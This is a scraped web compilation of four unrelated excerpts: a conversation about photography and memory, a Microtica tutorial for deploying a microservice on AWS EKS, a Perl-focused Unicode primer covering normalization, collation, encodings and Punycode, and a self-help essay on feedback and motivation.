psychological burden of feeling the need to capture AND to be present.</strong>&nbsp;I think it’s the more important function of the two.&nbsp;</p><div><p>Out of curiosity I looked up the root words for photography.&nbsp;<em>Photo</em>, meaning “light”, and&nbsp;<em>graphy</em>, meaning draw. A photographer is literally “drawing with light”—creating an enlightening experience for the person viewing a photograph after it’s been taken.&nbsp;</p><p><strong>Ayomide</strong>: “Drawing with light” should be the dictionary definition of photography! A photo captures the moment, but like a painting or sculpture, also offers a handle on the context surrounding that moment. Like when you’re on a tour and you see a statue, and the tour guide tells you its story and why it’s more than just bronze. A photo is like that, except you’re also the tour guide. It captures a moment to later trigger a memory of other moments, including before and after the one in the photo. You don’t want to lose that context of that moment in the very attempt to capture it.&nbsp;</p></div><p>That’s why high school reunions fall flat, or returning to your childhood street. You have these fond memories (if you’re lucky) of your street or school, and then one day you get a chance to relive them—to see your high school friends, to return to your childhood street. Of course we often end up regretting that, because it’s not quite the same. The friends feel hollow, the street feels dull, even when they haven’t changed that much—you have.&nbsp;</p><p>Were you really better off knowing the “truth” about that past moment, or are you better off with the good memories you had of it? That’s a trick question, though, because what we call our “memories” are really stories that we put together from our snapshots of the past—the snapshots alone can’t live up to our stories.</p><p><strong>Adam:&nbsp;</strong>It’s such a great question and one many of us can relate to, especially the part about reliving childhood memories. The truth is often a disappointing version of a memory you hold dearly. The spaceship you had built is a heap of cardboard boxes; the castle a musty sofa surrounded by yellowed pillows.&nbsp;</p><p>There was a science fiction novel written in 1760,&nbsp;<em><a href="https://en.wikipedia.org/wiki/Giphantie" target="_blank" rel="noreferrer noopener nofollow">Giphantie</a></em>, whose author described something quite similar to color photography, and said that once you complete the process “…<em>you have a picture the more precious in that no art can imitate its truthfulness.</em>” In this way a photo can serve as “truth” but&nbsp;<em>also&nbsp;</em>allow you to keep the memories you hold most dear, because your brain remembers (or creates!) the context around the photo.&nbsp;</p><p>Maybe this is why we take a photo in the first place, as a way to trigger memories. Secondarily we use them to share those memories with others in a more “real” way. How better to describe a moment in time to someone who wasn’t there than with a photo? After all, they are “worth a thousand words.”</p><p><strong>Ayomide:</strong>&nbsp;Exactly. The photo then becomes a way to turn the personal memory to a shared one. And because memory is part of identity, that can be shared identity as well. I find that interesting, by the way: our memory is a fundamental aspect of our identity, but in such a quiet way we almost never think about it. Imagine, though, waking up tomorrow morning to realise you couldn’t recall anything about your life before you woke up. It was all just gone. The connection becomes immediately obvious. It’s why we have so many films about people who have lost their memory—they’re really exploring identity:&nbsp;<em>Who are you without your memories?</em>&nbsp;Which goes back to how identity is the story we believe about ourselves.&nbsp;</p><p><strong>Any answer we give to “Who are you?” is really a story. And the building blocks for the story include our beliefs and values and personality and relationships, and crucially, our memory. When we capture, we’re trying to save those building blocks. It’s a form of information compression.</strong></p><p><strong>Adam:&nbsp;</strong>So how can we find more ways …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div>
<p>Kubernetes is the most popular open-source platform for managing containerized workloads and services. Kubernetes abstracts the underlying infrastructure layer. As a result, developers can focus on building applications, then deploy them to any of those environments.</p>



<p>To bring Kubernetes closer to developers, we’ve created a ready-to-use <a href="https://github.com/microtica-components/component-aws-eks" target="_blank" rel="noreferrer noopener">infrastructure component for Kubernetes</a>. This component uses AWS EKS as a service and sets Kubernetes master and nodes in auto-scaling infrastructure setup. Nodes are EC2 instances based on Kubernetes optimized AMIs.</p>



<blockquote><p><em>Components are a core concept in Microtica which allow developers to create and release their custom Cloud infrastructure setup in a standardized way. A</em>fter <em>the component is created, it can be reused in as many projects and environments as needed.</em></p></blockquote>



<p>In addition to the <a rel="noreferrer noopener" href="https://microtica.com/start-creating-infrastructure-on-aws-like-a-pro/" target="_blank">infrastructure setup</a> for Kubernetes, <a rel="noreferrer noopener" href="http://www.microtica.com/" target="_blank">Microtica</a> also offers you CI and CD for microservices. This means that you don’t have to worry about the complex details of the integration with Kubernetes. With this, we cover the whole process of software and infrastructure delivery.</p>



<p>In this article, we will learn how to <strong>deploy a microservice in the cloud with our Kubernetes component</strong>. Let’s get started by <a rel="noreferrer noopener" href="https://portal.microtica.com/register" target="_blank">creating your account</a> and project in Microtica. To deploy your first microservice in under 10 mins, follow these steps:</p>



<h3><strong>1. Add your AWS Account</strong></h3>



<p>First, go into <em>Settings</em>, then <em>AWS Accounts </em>tab, then <em>Add New Account</em>. Follow the steps to connect your account.</p>



<p><em>Note: All resources will be created on the provided AWS account, expenses will be calculated according to AWS pricing for using the services.</em></p>



<h3><strong>2. Create an environment</strong></h3>



<p>With a connected AWS account, you can continue to create your environment in which you’ll deploy your infrastructure. <a href="https://portal.microtica.com/environments/create" target="_blank" rel="noreferrer noopener">Create an environment</a> following the wizard on Microtica and then continue to add the components we will need.</p>



<h3><strong>3. Add components</strong></h3>



<p>To successfully setup a working Kubernetes Cluster in which we’ll deploy a microservice, we will need only 2 components: a <strong>VPC component </strong>and of course a <strong>Kubernetes Cluster component</strong>. We need the VPC (Amazon Virtual Private Cloud) component to enable us to launch AWS resources into a virtual network that we’ve defined. This virtual network is dedicated to your AWS account. This component sets one AWS VPC, and four subnets (2 public and 2 private subnets).</p>



<p>Here’s how to configure your components to connect them and create the infrastructure.</p>



<figure><img src="https://mk0microtica2di3k2co.kinstacdn.com/wp-content/uploads/2020/04/07-jW74q-UenBJfwF-1024x510.png" alt="creating an AWS VPC Component

<p><em>Note: You will need to create an EC2 key-pair from the AWS console. We don’t create it automatically due to security reasons. This key should always be in your possession and kept in a secure place. This key will allow you to access your EC2 instances through SSH.</em></p>

<p>When configuring the parameters for the Kubernetes Cluster component you can reference the VPC component so you <strong>don’t have to manually reenter the values</strong>. Microtica will take care of the order in which the components will be deployed in the cloud. This will allow you to have a working environment.</p>

<p>With the configuration set in place, you can deploy your environment by clicking <em>Create Plan</em>. Here you will see a detailed listing of the resources that are about to be added to the environment. Confirming will initiate the deployment and lead you to a page where you can follow the logs and events that are happening. Setting up this infrastructure can take up to 15 mins, so let us get started with our microservice in the meantime.</p>



<h3><strong>4. Create a microservice</strong></h3>



<p>For the purposes of this example, we will be using a simple <a rel="noreferrer noopener" href="https://hub.docker.com/_/hello-world" target="_blank">Hello World microservice</a> available in Docker hub. First, go to <a rel="noreferrer noopener" href="https://portal.microtica.com/microservices/create" target="_blank"><em>Microservices/Create microservice</em></a><em> </em>and follow the wizard in Microtica. For a source select public docker image and paste <strong>hello-world</strong>. Then, click <em>Next</em>, then <em>Create Microservice </em>and now we have our microservice.</p>



<figure><img src="https://mk0microtica2di3k2co.kinstacdn.com/wp-content/uploads/2020/04/Screen-Shot-2020-04-06-at-11.38.52-AM-1024x492.png" alt="Creating a Kubernetes microservice
" srcset="https://mk0microtica2di3k2co.kinstacdn.com/wp-content/uploads/2020/04/Screen-Shot-2020-04-06-at-11.38.52-AM-1024x492.png 1024w, https://mk0microtica2di3k2co.kinstacdn.com/wp-content/uploads/2020/04/Screen-Shot-2020-04-06-at-11.38.52-AM-300x144.png 300w, https://mk0microtica2di3k2co.kinstacdn.com/wp-content/uploads/2020/04/Screen-Shot-2020-04-06-at-11.38.52-AM-768x369.png 768w, https://mk0microtica2di3k2co.kinstacdn.com/wp-content/uploads/2020/04/Screen-Shot-2020-04-06-at-11.38.52-AM-1536x738.png 1536w, https://mk0microtica2di3k2co.kinstacdn.com/wp-content/uploads/2020/04/Screen-Shot-2020-04-06-at-11.38.52-AM-2048x984.png 2048w, https://mk0microtica2di3k2co.kinstacdn.com/wp-content/uploads/2020/04/Screen-Shot-2020-04-06-at-11.38.52-AM-740x356.png 740w" sizes="100vw"><figcaption>Create microservice from public Docker image</figcaption></figure>



<p>As a result of using a docker image as a source, we already have a built artifact so we can immediately deploy it in the Kubernetes cluster. <strong>You can do this from <em>Microservice details — Add to Cluster</em>, or in the<em> Kubernetes Dashboard — Microservices — Deploy.</em></strong></p>

<p>Microtica offers configuration options when deploying your microservice in a Kubernetes Cluster.&nbsp;&nbsp;You can select the scaling options, and as well setup continuous delivery for your microservice.</p>



<p>After successfully deploying the microservice in the Kubernetes Cluster you can preview your microservice by following the <strong><em>Access URL/hello-world-ms</em></strong><em> </em>(the name of the service if you’ve changed it). You should see this in your browser window:</p>



<div><figure><img src="https://mk0microtica2di3k2co.kinstacdn.com/wp-content/uploads/2020/04/0KLYx9DQIHY9wBiN8.png" alt="Your first microservice on a Kubernetes cluster
"></figure></div>



<p><strong>AND WE ARE DONE! WE JUST DEPLOYED OUR FIRST MICROSERVICE ON A KUBERNETES CLUSTER 👏</strong></p>



<h3><strong>5. Bonus: Cleanup</strong></h3>



<p>To remove all the resources we created on your AWS account go to environment details and in the menu select <em>Undeploy. </em>As a result, you’ll get your resources created on AWS cleaned. However, you will still have the configuration in Microtica in case you want to deploy it in the cloud again.</p>

      <!-- /.post-info -->      <h2>Why</h2>
<p>One encoding covering <em>most</em> of the world’s writing systems. Standard
encoding of the web, most operating systems, Java and .NET.</p>
<p>Before Unicode, each script (or script family) had its own encoding, or
worse, lots of different incompatible encodings. Unicode is a superset
of almost all of them, so can be used for interchange.</p>
<p>It’s been around for <a href="http://www.unicode.org/history/unicode88.pdf">over 30 years</a>.</p>
<p><em>Note: code examples are Perl-centric so far, because it has really good Unicode
support and I know it; if you have examples for other languages, please do post
a comment!</em></p>
<h2>What</h2>
<p><img alt="Unicode character examples" src="https://richardjharris.github.io/static/images/unichar-examples.png"></p>
<p>Unicode defines a <em>code point</em> (number) for every character, such as <span><span data-code="0061" data-name="LATIN SMALL LETTER A" title="LATIN SMALL LETTER A (U+0061)">a</span></span>, <span><span data-code="00E3" data-name="LATIN SMALL LETTER A WITH TILDE" title="LATIN SMALL LETTER A WITH TILDE (U+00E3)">ã</span></span>,
<span><span data-code="06D0" data-name="ARABIC LETTER E" title="ARABIC LETTER E (U+06D0)">ې</span></span>, <span><span data-code="4E0D" data-name="CJK UNIFIED IDEOGRAPH-4E0D" title="CJK UNIFIED IDEOGRAPH-4E0D (U+4E0D)">不</span></span> and <span><span data-code="2603" data-name="SNOWMAN" title="SNOWMAN (U+2603)">☃</span></span>. As of <a href="http://www.unicode.org/versions/Unicode6.2.0/">Unicode 6.2</a> there are <strong>109,976</strong> code points!
<em>(You can mouseover any highlighted character for more information.)</em></p>
<p>It also includes <em>combining characters</em> such as <span><span data-code="0300" data-name="COMBINING GRAVE ACCENT" title="COMBINING GRAVE ACCENT (U+0300)">◌̀</span></span> which can be added to
other characters; this way, Unicode does not need a code point for every possible
combination of letter and accent. On the other hand, Unicode <em>generally</em> doesn’t care
about fonts or stylistic differences: it gives <img alt="a (double-story)" src="https://richardjharris.github.io/static/images/a1.png">
and <img alt="a (single-story)" src="https://richardjharris.github.io/static/images/a2.png"> the same codepoint.</p>
<p>It’s <em>more than just a character set</em>: it also covers standard encodings such
as UTF-8; <nobr>lower/upper/title</nobr> case mapping; collation (sorting); line breaks;
rendering; right-to-left script handling, and more.</p>
<h2>Normalization</h2>
<p>For compatibility with other encodings Unicode sometimes includes <em>precomposed</em>
versions of characters, for example, these three:</p>
<ul>
<li><span><span data-code="00C5" data-name="LATIN CAPITAL LETTER A WITH RING ABOVE" title="LATIN CAPITAL LETTER A WITH RING ABOVE (U+00C5)">Å</span><span> LATIN CAPITAL LETTER A WITH RING ABOVE (U+00C5)</span></span></li>
<li><span><span data-code="212B" data-name="ANGSTROM SIGN" title="ANGSTROM SIGN (U+212B)">Å</span><span> ANGSTROM SIGN (U+212B)</span></span></li>
<li><span><span data-code="0041" data-name="LATIN CAPITAL LETTER A" title="LATIN CAPITAL LETTER A (U+0041)">A</span><span> LATIN CAPITAL LETTER A (U+0041)</span></span> + <span><span data-code="030A" data-name="COMBINING RING ABOVE" title="COMBINING RING ABOVE (U+030A)">◌̊</span><span> COMBINING RING ABOVE (U+030A)</span></span></li>
</ul>
<p>For these to be treated as the same string in equality tests etc. you should
run all input through <a href="http://unicode.org/reports/tr15/">Unicode normalisation</a>. The most common form is
<abbr title="Normalisation Form C (canonical decomposition + canonical composition)">NFC</abbr>, which uses pre<strong>C</strong>omposed characters where possible, and defines a strict ordering
of diacritics if more than one exists. <abbr title="Normalization Form D (canonical decomposition)">NFD</abbr> <strong>D</strong>ecomposes characters where possible.<sup id="fnref:gory"><a href="#fn:gory" rel="footnote">1</a></sup></p>
<p>It doesn’t matter what form you use as long as you are consistent; NFD is
faster in general (fewer codepoints) and <a href="http://stackoverflow.com/a/6163129/74496">tchrist</a> suggests running input
through NFD and output through NFC.</p>
<p><strong>Compatibility decomposition</strong> also maps characters such as <span><span data-code="FB03" data-name="LATIN SMALL LIGATURE FFI" title="LATIN SMALL LIGATURE FFI (U+FB03)">ﬃ</span></span>, <span><span data-code="2168" data-name="ROMAN NUMERAL NINE" title="ROMAN NUMERAL NINE (U+2168)">Ⅸ</span></span>
and even <span><span data-code="2075" data-name="SUPERSCRIPT FIVE" title="SUPERSCRIPT FIVE (U+2075)">⁵</span></span> to ‘ffi’, ‘IX’ and ‘5’ respectively. This <abbr title="Normalization Form KC (compatibility decomposition + canonical composition)">NFKC</abbr> normalisation
helps when searching for text.</p>

<h2>Casefolding</h2>
<p>Casing is not so simple in the Unicode world:</p>
<ul>
<li>
<p>Some strings actually change length when they change case: <span><span data-code="00DF" data-name="LATIN SMALL LETTER SHARP S" title="LATIN SMALL LETTER SHARP S (U+00DF)">ß</span></span> uppercases
  to ‘SS’.</p>
</li>
<li>
<p><span><span data-code="017F" data-name="LATIN SMALL LETTER LONG S" title="LATIN SMALL LETTER LONG S (U+017F)">ſ</span><span> LATIN SMALL LETTER LONG S</span></span> should be seen as equal to ‘s’ and ‘S’ in case-insensitive comparisons.</p>
</li>
<li>
<p><span><span data-code="03A3" data-name="GREEK CAPITAL LETTER SIGMA" title="GREEK CAPITAL LETTER SIGMA (U+03A3)">Σ</span><span> GREEK CAPITAL LETTER SIGMA</span></span> has <em>two</em> lowercase forms: <span><span data-code="03C3" data-name="GREEK SMALL LETTER SIGMA" title="GREEK SMALL LETTER SIGMA (U+03C3)">σ</span></span> at the beginning or middle of the
  word, and <span><span data-code="03C2" data-name="GREEK SMALL LETTER FINAL SIGMA" title="GREEK SMALL LETTER FINAL SIGMA (U+03C2)">ς</span></span> at the end of a word.</p>
</li>
<li>
<p>Casing is <em>mostly</em> consistent across locales, but Turkish is an exception: it
  has both a <a href="https://en.wikipedia.org/wiki/Dotted_and_dotless_I">Dotted and dotless I</a>, in both lower and upper cases.</p>
</li>
</ul>
<p>To ensure your code handles these cases, and any new ones, Unicode provides a
<em>one-way</em> ‘casefold’ operation that allows case-insensitive comparison:</p>
<div><pre><span>#!/usr/bin/perl</span>
<span>use</span> <span>Unicode::</span><span>CaseFold</span><span>;</span>   <span># or: use v5.16;</span>
<span>sort</span> <span>{</span> <span>fc</span><span>(</span><span>$a</span><span>)</span> <span>cmp</span> <span>fc</span><span>(</span><span>$b</span><span>)</span> <span>}</span> <span>@stuff</span><span>;</span>
</pre></div>


<p>Casefolding does <em>not</em> include normalization, so do that too.</p>
<h2>Sorting</h2>
<p>Sorting (or <em>collation</em>) is <strong>locale specific</strong> and just as riddled with
pecularities as casing:</p>
<ul>
<li>
<p>German and Swedish both have ä and ö but sort them differently - German
    treats them as variants of the same letters without umlauts (i.e. ‘a<strong>ä</strong>bcdefghijklmno<strong>ö</strong>pqrstuvwxyz’)
    whereas Swedish considers them new letters, and puts them at the end (‘abcdefghijklmnopqrstuvwxyz<strong>äö</strong>‘)</p>
<p>It’s important that things are sorted in the order the user expects.</p>
</li>
<li>
<p>Sorting varies by application too; phonebooks are often sorted differently to book
    indices, for example.</p>
</li>
<li>
<p>For Chinese characters and other ideographs, there are many possible orders, e.g.
    pinyin (phonetic), by stroke count, etc.</p>
</li>
<li>
<p>Collations can be <em>tailored</em> based on user preferences, e.g. lower or upper-case first?</p>
</li>
</ul>
<p>It’s not enough to just sort by binary comparison. And codepoints aren’t generally in any
sensible order either. Fortunately Unicode specifies a <a href="http://www.unicode.org/reports/tr10/">Collation Algorithm</a>
that is immensely customisable, covers all the edge-cases, and does clever things to make
it reasonably fast. Here’s an example:<sup id="fnref:locale"><a href="#fn:locale" rel="footnote">2</a></sup></p>
<div><pre><span>#!/usr/bin/perl</span>
<span>use</span> <span>Unicode::Collate::</span><span>Locale</span><span>;</span>
<span>my</span> <span>$collator</span> <span>=</span> <span>Unicode::Collate::</span><span>Locale</span><span>-&gt;</span><span>new</span><span>(</span><span>locale</span> <span>=&gt;</span> <span>'DE'</span><span>);</span>
<span>my</span> <span>@sorted</span> <span>=</span> <span>$collator</span><span>-&gt;</span><span>sort</span><span>(</span><span>@array</span><span>);</span>
<span>$collator</span><span>-&gt;</span><span>cmp</span><span>(</span><span>$word</span><span>,</span> <span>$another_word</span><span>);</span>  <span># -&gt; -1, 0 or 1</span>
</pre></div>


<p>The <abbr title="Unicode Collation Algorithm">UCA</abbr> can do other clever things, such as sort ‘10’ after ‘2’ numerically, or sort
the character ‘?’ as if it was the string ‘question mark’.</p>
<h2>Encodings</h2>
<p>The big ones are <code>UTF-8</code>, <code>UTF-16</code> and <code>UTF-32</code>. Each one guarantees a reversible
mapping of almost every codepoint<sup id="fnref:every"><a href="#fn:every" rel="footnote">3</a></sup> to a byte sequence.</p>
<ul>
<li>
<p><strong>UTF-32</strong> is dead simple: each codepoint gets four bytes. Takes up tons of space,
  not recommended for interchange.</p>
</li>
<li>
<p><strong>UTF-8</strong> is very common the web. It’s byte-oriented (no endianness issues),
  handles corruption well, is ASCII-compatible and takes up minimal space for text
  that is mostly ASCII (e.g. HTML).</p>
<ul>
<li>
<p>Code points between U+0800 and U+FFFF, which includes commonly used <abbr title="Chinese, Japanese, Korean and Vietnamese">CJKV</abbr>
  characters, will take up 3 bytes instead of 2. So UTF-16 may be more space
  efficient.</p>
</li>
<li>
<p>ASCII-compatibility is helpful to allow UTF-8 to stealth its way through
  scripts and processes that are not Unicode-aware. But if such a system tries to
  do anything with the data (casing, sub-strings, regex), that data may be
  corrupted.</p>
</li>
</ul>
</li>
<li>
<p><strong>UTF-16</strong> is used by Java, .NET and Windows. It uses 2 bytes (16-bit) to
  represent the most common 63K codepoints, and 4 bytes for the less common 1M
  codepoints (using two ‘surrogate’ codepoints).</p>
<ul>
<li>
<p>Contrary to popular belief, UTF-16 is not a fixed-width encoding. But as
  long as it contains no surrogates, it can be treated as one, which can speed
  up string operations.</p>
</li>
<li>
<p>UTF-16 streams typically begin with <span><span data-code="FEFF" data-name="ZERO WIDTH NO-BREAK SPACE" title="ZERO WIDTH NO-BREAK SPACE (U+FEFF)">U+FEFF</span></span><sup id="fnref:bomnote"><a href="#fn:bomnote" rel="footnote">4</a></sup> to detect the endianness
  (byte order) of the stream. Otherwise, you can explicitly encode or decode
  via ‘UTF-16BE’ or ‘UTF-16LE’ to specify the endianness.</p>
</li>
</ul>
</li>
</ul>
<h2>Unicode and internationalised domain names</h2>
<p>International characters create a <a href="http://en.wikipedia.org/wiki/IDN_homograph_attack">big problem</a>
for domain names. Just as <span><span data-code="0049" data-name="LATIN CAPITAL LETTER I" title="LATIN CAPITAL LETTER I (U+0049)">I</span></span> and <span><span data-code="006C" data-name="LATIN SMALL LETTER L" title="LATIN SMALL LETTER L (U+006C)">l</span></span> look similar, Unicode multiplies that problem
by 1,000, in addition to adding numerous invisible control characters, spacing characters
and right-to-left text.</p>
<p>Browsers and registrars have implemented several measures against this:</p>
<ul>
<li>Many TLDs restrict which characters can be used in domain names.</li>
<li>Browsers may display the domain in Punycode (see below) if the domain includes characters
  from multiple scripts and/or characters not belonging to one of the user’s preferred languages.</li>
<li>Internationalised country codes such as .рф (Russia) only accept Cyrillic names.</li>
</ul>
<h3>nameprep/stringprep</h3>
<p><a href="http://tools.ietf.org/html/rfc3491">RFC 3491</a> defines <em>nameprep</em>, a mechanism
to case-fold, normalize and sanitize strings before they can be used in domain names. This
removes many invisible characters and throws an error if prohibited code points are in use.</p>
<p>It is implemented in terms of a wider framework called <em>stringprep</em>. In Perl, one can use
<a href="https://metacpan.org/module/Net::IDN::Encode">Net::IDN::Encode</a> which will also perform Punycode conversion.</p>
<h3>Punycode</h3>
<p>For legacy reasons DNS does not allow extended characters outside of ASCII, so Punycode
is an ASCII-compatible encoding scheme. For example, <code>café.com</code> becomes <code>xn--caf-dma.com</code>.
All Punycode-encoded domain components are instantly recognisable by their <code>xn--</code> prefix.</p>
<p>This goes for TLDs too: .中国 is really known as <em>xn—fiqs8s</em>.</p>
<h2>The problem of ‘user characters’</h2>
<p>In Perl at least, everything (<code>substr</code>, <code>length</code>, <code>index</code>, <code>reverse</code>…) works on the level
of codepoints. This is often not what you want, because what a user considers to be a
character such as ў is actually two codepoints (<span><span data-code="0079" data-name="LATIN SMALL LETTER Y" title="LATIN SMALL LETTER Y (U+0079)">y</span></span> + <span><span data-code="0306" data-name="COMBINING BREVE" title="COMBINING BREVE (U+0306)">◌̆</span></span>). Here’s a <a href="http://www.nntp.perl.org/group/perl.perl5.porters/2011/10/msg178687.html">really good
usenet post</a> on the subject.</p>
<p>Even seemingly innocuous things like <code>printf "%-10s", $str</code> breaks completely for combining characters,
double-width characters (e.g. Chinese/Japanese) or zero-width characters.</p>
<p>Fortunately Perl provides the <code>\X</code> regular expression metachar which matches exactly one
‘extended grapheme cluster’, i.e. what a user would consider a character to be. A more robust
solution is to install <a href="https://metacpan.org/module/Unicode::GCString">Unicode::GCString</a>:</p>
<div><pre><span>#!/usr/bin/perl</span>
<span>use</span> <span>Unicode::</span><span>GCString</span><span>;</span>
<span>use</span> <span>Unicode::</span><span>Normalize</span><span>;</span>
<span>use</span> <span>utf8</span><span>;</span>
<span>use</span> <span>open</span> <span>qw(:std :encoding(UTF-8))</span><span>;</span>

<span>my</span> <span>$s</span> <span>=</span> <span>NFD</span><span>(</span><span>"crème brûlée"</span><span>);</span>  <span># ensure combining marks get their own codepoint</span>

<span>print</span> <span>$g</span><span>-&gt;</span><span>substr</span><span>(</span><span>0</span><span>,</span><span>5</span><span>),</span> <span>"\n"</span><span>;</span>  <span># 'crème', not 'crèm'</span>
<span>print</span> <span>$g</span><span>-&gt;</span><span>substr</span><span>(</span><span>0</span><span>,</span><span>3</span><span>),</span> <span>"\n"</span><span>;</span>  <span># 'crè', not 'cre'</span>

<span>print</span> <span>"1234512345123451234512345|\n"</span><span>;</span>
<span>printf</span> <span>"%s%*s|\n"</span><span>,</span> <span>$g</span><span>,</span> <span>(</span><span>25</span> <span>-</span> <span>$g</span><span>-&gt;</span><span>columns</span><span>),</span> <span>''</span><span>;</span>  <span># 25 columns long (ᵔᴥᵔ)</span>

<span>printf</span> <span>"%-25s|\n"</span><span>,</span> <span>$s</span><span>;</span>                          <span># 22 columns long (╯°□°）╯︵ ┻━┻</span>
</pre></div>


<h3>Line breaks</h3>
<p>Line breaking (or word wrapping) is another thing that becomes <a href="http://www.unicode.org/reports/tr14/">insanely complicated</a>
once Unicode is involved. You have to account for various non-breaking and breaking control
and spacing characters, punctuation in every language (e.g. <span><span data-code="00AB" data-name="LEFT-POINTING DOUBLE ANGLE QUOTATION MARK" title="LEFT-POINTING DOUBLE ANGLE QUOTATION MARK (U+00AB)">«</span></span> and <span><span data-code="00BB" data-name="RIGHT-POINTING DOUBLE ANGLE QUOTATION MARK" title="RIGHT-POINTING DOUBLE ANGLE QUOTATION MARK (U+00BB)">»</span></span> quotes, or the
full stop or comma being used in numerics such as <code>2,140</code>) and the width of each character.</p>
<p>In Perl, this has all been handled for you - just use <a href="https://metacpan.org/module/Unicode::LineBreak">Unicode::LineBreak</a>.</p>
<h2>Regular expressions</h2>
<p>Some useful Perl regular expression syntax:</p>
<dl>
<dt><code>\R</code></dt>
<dd>Match any Unicode linebreak sequence (including <code>\n</code>, <code>\r\n</code> and six others)</dd>
<dt><code>\p</code>, <code>\P</code></dt>
<dd>Match any codepoint possessing (or not possessing) a Unicode property.</dd>
<dd>Common ones are <code>\pL</code> (Letter), <code>\pU</code> (Uppercase), <code>\pS</code> (Symbol), or even <code>\p{script=Latin}</code>,
<code>\p{East_Asian_Width=Wide}</code>, <code>\p{Numeric_Value=4}</code>.</dd>
<dd>See <a href="http://perldoc.perl.org/perluniprops.html">perluniprops</a> for a big list.</dd>
<dd>Built-in character classes such as <code>\w</code>, <code>\b</code>, <code>\s</code> and <code>\d</code> are Unicode-aware since Perl
5.6 (though you need to make sure your string or pattern has the <code>UTF8</code> flag on!) Disable this
with the <code>/a</code> flag (see <a href="http://perldoc.perl.org/perlre.html#Character-set-modifiers">perlre</a>).</dd>
<dt><code>\X</code></dt>
<dd>Match an extended grapheme cluster, which is basically …</dd></dl></div></div>

At times, they even finish each other sentences – like in the movies.</p><figure><img width="1024" height="512" src="https://durmonski.com/wp-content/uploads/2020/08/getting-positive-feedback-1024x512.jpg" alt="getting-positive-feedback" srcset="https://durmonski.com/wp-content/uploads/2020/08/getting-positive-feedback-1024x512.jpg 1024w, https://durmonski.com/wp-content/uploads/2020/08/getting-positive-feedback-300x150.jpg 300w, https://durmonski.com/wp-content/uploads/2020/08/getting-positive-feedback-770x385.jpg 770w, https://durmonski.com/wp-content/uploads/2020/08/getting-positive-feedback-1536x768.jpg 1536w, https://durmonski.com/wp-content/uploads/2020/08/getting-positive-feedback-566x283.jpg 566w, https://durmonski.com/wp-content/uploads/2020/08/getting-positive-feedback-1151x575.jpg 1151w, https://durmonski.com/wp-content/uploads/2020/08/getting-positive-feedback-1481x740.jpg 1481w, https://durmonski.com/wp-content/uploads/2020/08/getting-positive-feedback-274x137.jpg 274w, https://durmonski.com/wp-content/uploads/2020/08/getting-positive-feedback-751x376.jpg 751w, https://durmonski.com/wp-content/uploads/2020/08/getting-positive-feedback-1381x691.jpg 1381w, https://durmonski.com/wp-content/uploads/2020/08/getting-positive-feedback.jpg 2000w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>Getting positive feedback from others means that what you do is worth pursuing further.</figcaption></figure><p>But after the initial honeymoon phase, after the thrill of the relationship has disappeared, they start to feel irritated from the smallest thing. Yes, at this stage, even a single unwashed dish can cause an argument.</p><p>It’s not so much that they stopped caring for each other, they simply stopped showing it.</p><figure><img width="1024" height="512" src="https://durmonski.com/wp-content/uploads/2020/08/getting-negative-feedback-1024x512.jpg" alt="getting-negative-feedback" srcset="https://durmonski.com/wp-content/uploads/2020/08/getting-negative-feedback-1024x512.jpg 1024w, https://durmonski.com/wp-content/uploads/2020/08/getting-negative-feedback-300x150.jpg 300w, https://durmonski.com/wp-content/uploads/2020/08/getting-negative-feedback-770x385.jpg 770w, https://durmonski.com/wp-content/uploads/2020/08/getting-negative-feedback-1536x768.jpg 1536w, https://durmonski.com/wp-content/uploads/2020/08/getting-negative-feedback-566x283.jpg 566w, https://durmonski.com/wp-content/uploads/2020/08/getting-negative-feedback-1151x575.jpg 1151w, https://durmonski.com/wp-content/uploads/2020/08/getting-negative-feedback-1481x740.jpg 1481w, https://durmonski.com/wp-content/uploads/2020/08/getting-negative-feedback-274x137.jpg 274w, https://durmonski.com/wp-content/uploads/2020/08/getting-negative-feedback-751x376.jpg 751w, https://durmonski.com/wp-content/uploads/2020/08/getting-negative-feedback-1381x691.jpg 1381w, https://durmonski.com/wp-content/uploads/2020/08/getting-negative-feedback.jpg 2000w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption>When you don’t get any good feedback from others, self-doubt consumes your mind.</figcaption></figure><p>Similar things happen when you start a project.</p><p>At first, you’re “in love” with the idea you want to materialize. You tell folks around you. You create mockups. You read stories of other people online who did similar things and, of course, succeeded.</p><p>All of these things are <em>feeding</em> your enthusiasm, giving you hope and more reasons to start the project. Invest money. And, even purchase online courses that promise to take your idea “to the next level”.</p><p>After the initial excitement, though, things start to take a different route. If you’re not part of the lucky 1% who are able to make it big on their product launch date, your passion slowly starts to decline.</p><p>Why?</p><p>Because not getting enough responses from other people about your work sucks.</p><p>While in the planning stage the feedback you received was mostly feed by your own desire to create what you wanted to create. When the project is live you now rely on outside people to give you boost. If such is not present – there are few or no orders, no one is liking your photos, people don’t reply to your emails – you start to lose motivation.</p><p>That’s why you want to quit and go do something else. Something more exciting. You convince yourself that this new thing will be “way better” and people will love it.</p><h2>Why Receiving Feedback is Important?</h2><p>As in a regular 9 to 5 job, if you work for a boss who doesn’t provide feedback, it’s easy to feel directionless. You start to wonder all sorts of things, “Is my performance good enough?”; “Should I focus more on A instead of B?”; “How can I get better at my work?”</p><p>Similar questions circle one’s mind when the caresses from their spouse stops, “Does he still loves me?”; “Why I’m no longer receiving lovely texts from him?”; “Am I getting older?”</p><p>In ancient times, when our ancestors first discovered fire, and even before that, tribes relied on cues from the environment to find food, useful tools, and avoid injuries from wild animals – a.k.a. losing an arm or being killed.</p><p>But not only this, from a biological standpoint, it makes sense to anticipate external feedback all the time. After all, the main function of the brain is to keep you well and alive.</p><p>During wars, people were constantly alarmed and conscious of their surroundings because they wanted to prevent themselves from being killed or badly injured.</p><p>This feedback loop is present all the time in different shapes and forms. Fortunately, getting caught in a crossfire or attacked by a wild animal is unlikely to happen nowadays. Our brains are now mainly worried about not getting validation from our own kind.</p><p>If you share a picture online and you get zero or not enough likes – whatever enough means for you – this translates into, “I’m not good enough.” The pressure to be socially accepted, online, can create a lasting feeling of unworthiness.</p><p>But measuring your self-worth by the number of likes is not a new discovery.<span id="easy-footnote-1-10677"></span><span><a href="#easy-footnote-bottom-1-10677" title="Validation seeking online has been around the block since social media was invented."><sup>1</sup></a></span> Yet, few people realize that the same thing carries over other important areas in our lives.</p><ul><li>Your spouse is no longer talking to you.</li><li>Your boss is rarely talking about your performance.</li><li>Your business is just a dusty place no one enters.</li></ul><p>No wonder you want to bail out. Go do something else to associate your I, <a aria-label="your ego (opens in a new tab)" 